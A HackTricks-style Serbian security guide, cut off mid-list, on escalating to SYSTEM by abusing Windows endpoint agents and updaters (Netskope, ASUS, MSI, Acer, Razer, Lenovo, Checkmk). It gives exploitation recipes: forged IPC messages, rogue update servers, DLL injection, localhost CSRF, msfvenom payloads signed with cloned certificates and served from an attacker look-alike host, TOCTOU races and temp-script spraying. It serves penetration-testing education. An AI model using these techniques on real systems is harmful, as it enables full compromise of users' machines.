# Zloupotreba korporativnih automatskih ažuriranja i privilegovanog IPC-a (npr. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu lanaca lokalne eskalacije privilegija u Windowsu, pronađenih u agentskim programima za korporativne krajnje tačke i programima za ažuriranje koji izlažu IPC površinu sa malim ograničenjima i privilegovani tok ažuriranja. Reprezentativni primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da preusmeri upisivanje na server pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete primeniti na slične proizvode:
- Zloupotrebite localhost IPC privilegovanog servisa da biste prinudili ponovno upisivanje ili rekonfiguraciju ka serveru napadača.
- Implementirajte krajnje tačke za ažuriranje proizvođača, isporučite lažni Trusted Root CA i usmerite program za ažuriranje na zlonamerni, „potpisani“ paket.
- Zaobiđite slabe provere potpisnika (spiskove dozvoljenih CN vrednosti), opcione oznake digest-a i labava MSI svojstva.
- Ako je IPC „šifrovan“, izvedite ključ/IV iz identifikatora mašine čitljivih svima, koji su sačuvani u registru.
- Ako servis ograničava pozivaoce prema putanji slike/procesu, ubacite kod u proces sa dozvoljene liste ili pokrenite takav proces u suspendovanom stanju i pokrenite svoju DLL biblioteku minimalnom izmenom konteksta niti.

Prilagođeni lokalni TCP servisi zaslužuju istu proveru identiteta i granica ulaznih podataka, čak i kada zahtevaju PIN ili druge akreditive aplikacije. Povežite listener sa njegovim procesom i efektivnim servisnim nalogom, a zatim proverite tačno instaliranu binarnu datoteku/verziju i da li se polja pod kontrolom pozivaoca proveravaju po dužini pre kopiranja u bafer fiksne veličine ili upotrebe za sastavljanje komande podređenog procesa. [Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) objašnjava zašto su neprovereni spoljni ulazni podaci opasni u privilegovanom nativnom kodu. Loopback listener, hardkodovani akreditiv ili samo ime procesa ne dokazuju oštećenje memorije niti izvršavanje kao SYSTEM; dostupnost, autorizacija, putanja izvršavanja koda i mere za ublažavanje rizika zasebni su uslovi. Uobičajeno nabrajanje obavljajte pasivno, umesto slanja ulaznih podataka dužine koja izaziva pad servisa uživo.

---
## 1) Prinudno usmeravanje upisivanja na server napadača preko localhost IPC-a

Mnogi agentski programi sadrže korisnički UI proces koji komunicira sa SYSTEM servisom preko localhost TCP-a koristeći JSON.

Uočeno u Netskope:
- UI: stAgentUI (nizak integritet) ↔ Servis: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok eksploatacije:
1) Napravite JWT token za upisivanje čije tvrdnje određuju backend host (npr. AddonUrl). Koristite alg=None da potpis ne bi bio potreban.
2) Pošaljite IPC poruku koja poziva provisioning komandu, zajedno sa vašim JWT-om i imenom tenant-a:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se provera pozivaoca zasniva na putanji/nazivu, pokrenite zahtev iz allow-listed vendor binarne datoteke (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Management IPC izložen preko mreže

Ova granica poverenja nije uvek ograničena na localhost. U prijavljenom slučaju MyReport Updater 2.1.1, servis `LocalSystem` slušao je na svim interfejsima i prihvatao neautentifikovanu gRPC izmenu konfiguracije za referentni host, port i režim rada. Za remote varijantu bili su neophodni i mrežni pristup listener-u i izlazni pristup servisa do izabranog reference host-a. Procenu ovih uslova obavite odvojeno od procene da li kasniji tok paketa može da pređe granicu za upisivanje datoteka.<sup>[[16]](#references)</sup>

---
## 2) Preotimanje update kanala radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira sa vašim serverom, implementirajte očekivane endpoint-e i navedite ga da preuzme MSI napadača. Tipičan sled:

1) /v2/config/org/clientconfig → Vratite JSON konfiguraciju sa veoma kratkim intervalom za updater, npr.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Vratite PEM CA sertifikat. Servis ga instalira u skladište Trusted Root za Local Machine.
3) /v2/checkupdate → Dostavite metapodatke koji upućuju na zlonamerni MSI i lažnu verziju.

Zaobilaženje uobičajenih provera:
- Dozvoljena lista CN vrednosti potpisnika: servis možda proverava samo da li je Subject CN jednak vrednosti „netSkope Inc” ili „Netskope, Inc.”. Vaš rogue CA može da izda leaf sertifikat s tim CN-om i potpiše MSI.
- Svojstvo CERT_DIGEST: uključite bezopasno MSI svojstvo pod nazivom CERT_DIGEST. Pri instalaciji se ne proverava.
- Opcionalna provera digest vrednosti: zastavica konfiguracije (npr. check_msi_digest=false) isključuje dodatnu kriptografsku proveru.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju zakrpa: ako dobavljač odgovori tako što dozvoli samo mali skup „pouzdanih” domena umesto da kriptografski autentifikuje izvor ažuriranja, potražite preusmerivače ili reverse proxy-je u vlasništvu dobavljača koji vam i dalje omogućavaju da usmeravate saobraćaj. U slučaju Netskope-a, javno dostupno naknadno istraživanje pokazalo je da se allow-list iz perioda R129 i dalje mogla zloupotrebiti preko `rproxy.goskope.com`, koji je prosleđivao sadržaj Azure App Service-a pod kontrolom napadača. Posmatrajte allow-list-e hostova kao prepreku koju treba preskočiti, a ne kao granicu poverenja.<sup>[[14]](#references)</sup>

Drugi način otkaza su **samodosledni, ali neautentifikovani metapodaci paketa**. U slučaju MyReport, referenca pod kontrolom napadača posluživala je izmenjenu arhivu, dok je posrednik menjao MD5 digest i vrednosti veličine dobavljača pre nego što bi stigle do programa za ažuriranje. Poklapanje tih vrednosti proveravalo je doslednost odgovora, a ne poreklo od dobavljača; nije bila potrebna MD5 kolizija. Direktorijum za instalaciju koji je birao pozivalac pretvorio je zatim privilegovano raspakivanje u granicu za upisivanje datoteka. Primitiva učitavanja DLL-a koja je time nastala obrađena je u odeljku [povezivanje произвољног уписивања датотека са DLL hijacking-ом](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsifikovanje šifrovanih IPC zahteva (ako postoje)

Od R127, Netskope je obavijao IPC JSON u polje encryptData koje izgleda kao Base64. Reverzni inženjering je pokazao da se koristi AES, čiji se ključ i IV izvode iz vrednosti u registru čitljivih svim korisnicima:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da ponove šifrovanje i pošalju validne šifrovane komande kao standardni korisnik.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent iznenada počne da „šifruje” svoj IPC, potražite ID-jeve uređaja, GUID-ove proizvoda i ID-jeve instalacije u HKLM kao materijal za izvođenje ključeva.

---
## 4) Zaobilaženje allow-list-a IPC pozivalaca (provere putanje/naziva)

Neki servisi pokušavaju da autentifikuju peer tako što pronalaze PID TCP veze i porede putanju/naziv izvršne datoteke sa allow-list-om binarnih datoteka dobavljača smeštenih u Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična načina zaobilaženja:
- DLL injection u proces sa allow-list-e (npr. nsdiag.exe) i prosleđivanje IPC zahteva iz tog procesa.
- Pokretanje binarne datoteke sa allow-list-e u suspendovanom stanju i pokretanje vaše proxy DLL datoteke bez CreateRemoteThread (pogledajte §5), kako bi se zadovoljila pravila zaštite od neovlašćenih izmena koja sprovodi drajver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection prilagođen zaštiti od neovlašćenih izmena: suspendovan proces + zakrpa NtContinue

Proizvodi često uključuju minifilter/OB callbacks drajver (npr. Stadrv) koji uklanja opasna prava sa handle-ova zaštićenih procesa:
- Proces: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Nit: ograničava prava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan loader u user-mode režimu koji poštuje ova ograničenja:
1) Pozovite CreateProcess za binarnu datoteku dobavljača sa CREATE_SUSPENDED.
2) Dobavite handle-ove koje i dalje smete da koristite: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za proces i handle niti sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako zakrpite kod na poznatom RIP-u).
3) Prepišite ntdll!NtContinue (ili drugi rani, garantovano mapirani thunk) malom stub funkcijom koja poziva LoadLibraryW za putanju vaše DLL datoteke, a zatim se vraća.
4) Pozovite ResumeThread da pokrenete stub unutar procesa i učitate vašu DLL datoteku.

Pošto niste koristili PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME na već zaštićenom procesu (vi ste ga kreirali), poštovana je politika drajvera.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope dodatak) automatizuje rogue CA, potpisivanje zlonamernog MSI-ja i posluživanje potrebnih endpoint-a: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je prilagođeni IPC klijent koji sastavlja proizvoljne IPC poruke (uz opcionalno AES šifrovanje) i uključuje injection u suspendovan proces kako bi poruke potekle iz binarne datoteke sa allow-list-e.<sup>[[4]](#references)</sup>

## 7) Brzi postupak trijaže za nepoznate površine programa za ažuriranje/IPC

Kada naiđete na novog endpoint agenta ili paket pomoćnih programa proizvođača matične ploče, brz postupak je obično dovoljan da utvrdite da li imate perspektivnu metu za privesc:<sup>[[6]](#references)</sup>

1) Nabrojte loopback listenere i utvrdite kojim procesima dobavljača pripadaju:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Izlistajte potencijalne imenovane cevi:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Izdvojite podatke o rutiranju koji se čuvaju u registru, a koriste ih IPC serveri zasnovani na dodacima:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpre izdvojite endpoint nazive, JSON ključeve i command ID-jeve iz klijenta u user-mode-u. Upakovani Electron/.NET frontendi često leak-uju kompletnu šemu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Potražite stvarni uslov poverenja, a ne samo putanju koda koja na kraju pokreće proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je pouzdan”, što omogućava kloniranje sertifikata ili druge trikove s lažnim potpisnikom.
- Provere podniski/sufiksa za `Origin`, `Referer`, URL-ove za preuzimanje, nazive procesa ili CN-ove potpisnika nisu autentifikacija. `contains(".vendor.com")` je obično moguće zloupotrebiti pomoću napadaču kontrolisanih domena sa sličnim nazivima.
- Ako GUI sa niskim privilegijama odluči da je „datoteka pouzdana”, a SYSTEM broker samo koristi taj rezultat, zakrpljivanje ili ponovna implementacija DLL/JS-a na strani klijenta često u potpunosti zaobilazi granicu (podeljena validacija u stilu Razer-a).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje sa te putanje, odmah testirajte prozore za zamenu TOCTOU i susedne dodatne module koji izlažu alternativne `ExecuteTask()` omotače sa slabijim proverama.<sup>[[6]](#references)</sup>

Za mete koje intenzivno koriste named pipe-ove, PipeViewer je brz način da uočite slabe DACL-ove i pipe-ove dostupne sa mreže pre nego što počnete detaljno da reverzujete protokol.<sup>[[11]](#references)</sup>

Ako meta autentifikuje pozivaoce samo pomoću PID-a, putanje do slike ili naziva procesa, smatrajte to preprekom koja samo usporava napad, a ne bezbednosnom granicom: često je dovoljno ubaciti kod u legitimni klijent ili uspostaviti vezu iz procesa sa dozvoljene liste da bi se zadovoljile provere servera. Konkretno za named pipe-ove, [ova stranica o lažnom predstavljanju klijenta i zloupotrebi pipe-ova](named-pipe-client-impersonation.md) detaljnije obrađuje ovaj primitivan mehanizam.

Za privilegovani **broker za čišćenje ili vraćanje**, proverite granicu poverenja putanje, kao i ACL pipe-a. Pozivalac sa nižim privilegijama možda može da izabere odredište za vraćanje ili preimenuje pripremljeni rezervni artefakt u deljenom direktorijumu, čak i kada su izvršna datoteka servisa i njen instalacioni direktorijum zaštićeni. Zasebno potvrdite da pozivalac može da pristupi komandi za vraćanje, da može da izmeni tačno navedeni припремљeni ulaz ili naziv datoteke, da se broker pokreće pod identitetom sa višim privilegijama i da operacija vraćanja zaista upisuje podatke na izabranu zaštićenu putanju. Direktorijum za pripremu u koji može da se upisuje ili pipe koji može da se čita sami po sebi ne dokazuju mogućnost proizvoljnog privilegovanog upisa; mapiranje odredišta i ponašanje servisa treba proveriti pregledom koda ili kontrolisanim testiranjem. Nemojte pokretati nepoznatu komandu za čišćenje tokom pasivnog izviđanja jer može da obriše korisničke datoteke.

---
## 8) Modularni brokeri dodataka koji se autentifikuju isključivo potpisima dobavljača (obrazac Lenovo Vantage)

Novija varijanta koju vredi tražiti jeste **RPC broker sa potpisanim klijentom**: Lenovo-signed desktop proces sa niskim privilegijama komunicira sa SYSTEM servisom, a servis usmerava JSON komande ka skupu dodataka opisanih u XML-u, smeštenih pod `%ProgramData%`. Kada se postigne izvršavanje koda **unutar bilo kog prihvaćenog potpisanog klijenta**, svaki ugovor sa `runas="system"` postaje deo površine za napad.<sup>[[15]](#references)</sup>

Primitivni mehanizmi visoke vrednosti uočeni tokom istraživanja Lenovo Vantage-a:
- **Poverenje u pozivaoca zato što ga je potpisao dobavljač**: istraživači su došli do autentifikovanog konteksta tako što su kopirali Lenovo-signed EXE u direktorijum u koji može da se upisuje i zadovoljili uslov za DLL side-load (`profapi.dll`), čime se omogućilo izvršavanje proizvoljnog koda unutar klijenta kome je servis već verovao.
- **Otkrivanje površine za napad pomoću manifesta**: dodaci su deklarisani u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora se izvršava kao `SYSTEM`, pa se pregledom tih manifesta često brže otkrivaju stvarne privilegovane komande nego reverzovanjem samog brokera.
- **Bube po pojedinačnim komandama iza autentifikovanog kanala**: kada se jednom nađe unutar pouzdanog klijenta, javna istraživanja otkrila su kombinacije path traversal-a i race condition-a u komandama za ažuriranje/instalaciju, zloupotrebu sirovog SQL-a u privilegovanim bazama podešavanja i provere putanja u registru zasnovane na podniskama koje su omogućavale upise izvan predviđenog hive-a.

Korisno izviđanje na meti:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktična pouka: kad god helper suite izlaže broker koji najpre autentifikuje **proces pozivaoca**, pa tek onda prosleđuje zahtev desetinama komandi za plugin/add-in, nemojte stati nakon zaobilaženja početne provere poverenja. Izdvojite tabelu manifesta/ugovora i zasebno fuzz-ujte svaku privilegovanu radnju; autentifikovani kanal obično skriva nekoliko bagova u drugoj fazi.

---
## 1) CSRF iz browsera ka localhost-u protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje HTTP servis u korisničkom režimu (ADU.exe) na adresi 127.0.0.1:53000, koji očekuje pozive browsera sa https://driverhub.asus.com. Provera origin-a samo izvršava `string_contains(".asus.com")` nad zaglavljem Origin i URL-ovima za preuzimanje koje izlaže `/asus/v1.0/*`. Zato svako ime hosta pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje zahteve koji menjaju stanje, koristeći JavaScript.<sup>[[6]](#references)</sup> Za dodatne obrasce zaobilaženja pogledajte [osnove CSRF-a](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i na njemu postavite zlonamernu veb-stranicu.
2) Koristite `fetch` ili XHR da pozovete privilegovanu krajnju tačku (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – upakovani frontend JS prikazuje šemu u nastavku.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Čak i PowerShell CLI prikazan ispod uspeva kada se Origin zaglavlje lažira tako da sadrži pouzdanu vrednost:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Svaka poseta napadačevom sajtu iz browsera zato postaje lokalni CSRF sa 1 klikom (ili 0 klikova preko `onload`) koji pokreće SYSTEM pomoćni program.

---
## 2) Neispravna provera code-signing potpisa i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne datoteke definisane u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Provera URL-a za preuzimanje koristi istu logiku zasnovanu na podniskama, pa se prihvata `http://updates.asus.com.attacker.tld:8000/payload.exe`. Nakon preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li se Subject string podudara sa ASUS-om pre nego što ga pokrene — nema `WinVerifyTrust` ni provere lanca sertifikata.

Da biste iskoristili ovaj tok:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov potpisnik u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na domenu koji liči na `.asus.com` i pokrenite UpdateApp preko prethodno opisanog browser CSRF-a.

Pošto su i Origin i URL filteri zasnovani na podniskama, a provera potpisnika samo upoređuje stringove, DriverHub preuzima i izvršava napadačevu binarnu datoteku u svom povišenom kontekstu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU u putanjama za kopiranje/izvršavanje programa za ažuriranje (MSI Center CMD_AutoUpdateSDK)

MSI Center-ova SYSTEM usluga izlaže TCP protokol u kojem se svaki okvir sastoji od `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Osnovna komponenta (Component ID `0f 27 00 00`) isporučuje `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njena obrada:
1) Kopira dostavljenu izvršnu datoteku u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava potpis preko `CS_CommonAPI.EX_CA::Verify` (subject sertifikata mora biti jednak „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` mora uspeti).
3) Kreira zakazani zadatak koji pokreće privremenu datoteku kao SYSTEM, uz argumente pod kontrolom napadača.

Kopirana datoteka nije zaključana između provere i `ExecuteTask()`. Napadač može da:
- Pošalje okvir A sa legitimnom MSI-potpisanom binarnom datotekom (čime osigurava da provera potpisa prođe i da se zadatak stavi u red čekanja).
- U trci šalje ponavljane poruke okvira B koje upućuju na zlonamerni payload i prepisuju `MSI Center SDK.exe` odmah nakon završetka provere.

Kada se zakazani zadatak pokrene, izvršava prepisani payload kao SYSTEM, iako je proverena originalna datoteka. Pouzdano iskorišćavanje koristi dve goroutine/niti koje neprekidno šalju CMD_AutoUpdateSDK dok ne pobede u TOCTOU trci.<sup>[[6]](#references)</sup>

---
## 2) Iskorišćavanje prilagođenog IPC-a na nivou SYSTEM-a i impersonation-a (MSI Center + Acer Control Centre)

### MSI Center TCP skupovi komandi
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan u `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta okvira biraju tu komponentu, što napadačima omogućava da usmere komande ka proizvoljnim modulima.
- Plugin-ovi mogu da definišu sopstvene task runner-e. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` **bez provere potpisa** — svaki lokalni korisnik može da mu prosledi putanju `C:\Users\<user>\Desktop\payload.exe` i pouzdano dobije SYSTEM izvršavanje.
- Sniffing loopback-a pomoću Wireshark-a ili instrumentacija .NET binarnih datoteka u dnSpy-ju brzo otkriva mapiranje komponenti na komande; zatим prilagođeni Go/Python klijenti mogu ponovo da pošalju okvire.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe-ови i impersonation nivoi
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegova diskreciona ACL lista dozvoljava udaljene klijente (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID-ja `7` sa putanjom do datoteke poziva rutinu usluge za pokretanje procesa.
- Klijentska biblioteka serijalizuje magični završni bajt (113) zajedno sa argumentima. Dinamička instrumentacija pomoću Frida/`TsDotNetLib` (pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentaciji) pokazuje da izvorni handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i SID integriteta pre poziva `CreateProcessAsUser`.
- Zamena vrednosti 113 (`0x71`) sa 114 (`0x72`) preusmerava izvršavanje u generičku granu koja zadržava ceo SYSTEM token i postavlja SID visokog integriteta (`S-1-16-12288`). Pokrenuta binarna datoteka zato radi kao neograničeni SYSTEM, lokalno i preko mreže, na drugoj mašini.
- Kombinujte ovo sa izloženom zastavicom instalacionog programa (`Setup.exe -nocheck`) da biste instalirali ACC i na laboratorijskim VM-ovima i testirali pipe bez hardvera proizvođača.<sup>[[6]](#references)</sup>

Ove IPC ranjivosti pokazuju zašto localhost usluge moraju da zahtevaju uzajamnu autentifikaciju (ALPC SID-ove, `ImpersonationLevel=Impersonation` filtere, filtriranje tokena) i zašto svi pomoćni programi „run arbitrary binary” u svakom modulu moraju da koriste iste provere potpisnika.

---
## 3) COM/IPC „elevator” pomoćni programi zasnovani na slaboj validaciji u user-mode-u (Razer Synapse 4)

Razer Synapse 4 dodaje još jedan koristan obrazac u ovu grupu: korisnik sa niskim privilegijama može da zatraži od COM pomoćnog programa da pokrene proces preko `RzUtility.Elevator`, dok se odluka o poverenju prepušta user-mode DLL-u (`simple_service.dll`) umesto da se pouzdano sprovodi unutar privilegovane granice.

Uočeni tok iskorišćavanja:
- Instancirajte COM objekat `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da biste zatražili pokretanje sa povišenim privilegijama.
- U javnom PoC-u, PE provera potpisa unutar `simple_service.dll` uklanja se patch-ovanjem pre slanja zahteva, što omogućava pokretanje proizvoljne izvršne datoteke koju je izabrao napadač.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalni PowerShell poziv:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Opšti zaključak: prilikom reverse engineeringa „helper“ paketa nemojte se zaustaviti na localhost TCP-u ili imenovanim cevima. Proverite da li postoje COM klase s nazivima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovana usluga zaista sama validira ciljnu binarnu datoteku ili samo veruje rezultatu koji je izračunao DLL klijenta u korisničkom režimu koji se može patchovati. Ovaj obrazac nije ograničen na Razer: svaki dizajn s podeljenim komponentama, u kojem broker s visokim privilegijama koristi odluku o dozvoli/odbijanju koju donosi strana s niskim privilegijama, može predstavljati površinu za privesc.


---
## Predvidljivo izvršavanje privremene skripte tokom MSI popravke (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što upisuju privremenu `.cmd` datoteku u `C:\Windows\Temp` i pokreću je kao `SYSTEM`. Ako je naziv datoteke predvidljiv, a usluga ne kreira bezbedno novu datoteku kada već postoji, korisnik s niskim privilegijama može unapred da napravi buduću privremenu datoteku kao **samo za čitanje** i navede privilegovani proces da izvrši sadržaj koji kontroliše napadač umesto sopstvene skripte.

Uočeno u ranjivim izdanjima Checkmk Agent-a:
- obrazac za privremene datoteke: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: MSI **popravka** keširanog paketa agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktičan postupak:
1. Procenite realan raspon PID-ova na osnovu trenutnih ID-jeva procesa ili PID-a pokrenutog agenta.
2. Napišite kratko **ASCII** `.cmd` payload obeležje (`Set-Content -Encoding Ascii` ili preusmeravanjem izlaza iz `cmd.exe`; izbegavajte PowerShell izlaz u UTF-16 formatu za batch datoteke).
3. Raspršite datoteke `C:\Windows\Temp\cmk_all_<PID>_1.cmd` po odabranom rasponu i označite svaku kao samo za čitanje.
4. Pokrenite popravku keširanog MSI-ja kako bi privilegovana usluga pokušala da ponovo kreira, a zatim izvrši privremenu skriptu.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ako je ranjivi proizvod instaliran pomoću programa Windows Installer, utvrdite kom proizvodu pripada MSI datoteka nasumičnog naziva keširana u `C:\Windows\Installer` pre pokretanja popravke:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz neinteraktivne WinRM ljuske i treba da utvrdite da li postojeća desktop/isključena sesija može ispravno da pokrene popravku.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge endpoint agente i programe za ažuriranje koji **postavljaju privremene skripte na lokacije dostupne za upis svim korisnicima, a kasnije ih izvršavaju kao SYSTEM**. Proverite da li se koriste predvidljiva imena, da li nedostaje semantika ekskluzivnog kreiranja i da li se tokovi popravke/ažuriranja mogu pokrenuti na zahtev.

### Popravka interaktivnog instalera i privilegovana konzola

PDF24 Creator 11.15.1 pokazuje zaseban rizik pri MSI popravci: njegova prilagođena akcija za instalaciju štampača može tokom popravke da pokrene vidljivu konzolu sa SYSTEM pravima. Proizvođač je izmenio MSI installer u verziji 11.15.2 da bi rešio ovo ponašanje. Starija verzija proizvoda samo je trag za trijažu. Proverite registrovani ili dostupan MSI paket, da li ovaj korisnik može da pokrene popravku, da li su prisutni ranjiva prilagođena akcija i odlaganje upisa u log fajl, kao i da li interaktivna radna površina može da prikaže konzolu. Prijavljeno odlaganje koristilo je oplock na `faxPrnInst.log`; obična mogućnost upisa u fajl nije jedini uslov za pristup. Neinteraktivna ljuska, nedostupan paket ili zakrpljeni installer mogu prekinuti ovaj lanac. Ovaj problem ne zavisi od `AlwaysInstallElevated` i razlikuje se od zamene predvidljive privremene skripte.

---
## Udaljeno preuzimanje kontrole nad lancem snabdevanja putem slabe validacije programa za ažuriranje (WinGUp / Notepad++)

Od juna 2025. do decembra 2025. napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ toka ažuriranja selektivno su isporučivali zlonamerne manifeste odabranim žrtvama. Stariji programi za ažuriranje zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost ažuriranja, pa je zlonameran XML odgovor mogao da preusmeri klijente na URL-ove koje kontrolišu napadači. Pošto klijent prihvata HTTPS sadržaj, a da ne zahteva istovremeno pouzdan lanac sertifikata i važeći PE potpis preuzetog instalera, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Presretanje infrastrukture**: kompromitovati CDN/hosting i odgovarati na provere ažuriranja metapodacima napadača koji upućuju na zlonamerni URL za preuzimanje.
